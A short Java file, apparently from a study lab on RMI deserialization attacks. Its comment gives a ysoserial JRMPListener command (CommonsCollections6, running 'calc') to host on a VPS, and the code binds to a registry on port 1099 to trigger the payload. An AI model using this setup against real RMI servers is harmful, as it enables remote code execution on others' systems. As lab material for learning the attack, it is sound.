package RMI.RAC2S;

import RMI.SAC.TestInterfaceImpl;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/*
open ysoserial.exploit.JRMPListener in your vps
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'calc'
 */
public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        TestInterfaceImpl testInterface = new TestInterfaceImpl();
        registry.bind("test", testInterface);
    }
}
